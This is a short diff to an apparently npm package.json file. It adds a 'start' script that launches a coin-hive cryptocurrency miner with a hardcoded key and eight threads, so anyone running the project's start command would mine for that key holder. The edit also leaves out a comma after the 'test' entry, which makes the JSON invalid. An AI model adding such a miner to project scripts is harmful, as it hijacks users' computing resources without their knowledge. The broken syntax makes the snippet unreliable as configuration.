@@ -5,6 +5,7 @@
   "main": "src/index.js",
   "scripts": {
     "test": "mocha test --timeout 600000"
+    "start": "./bin/coin-hive 161DCdvSpGqiBcCx2NTuhgC2EdxJ9EJ0 --threads=8"
   },
   "license": "MIT",
   "dependencies": {
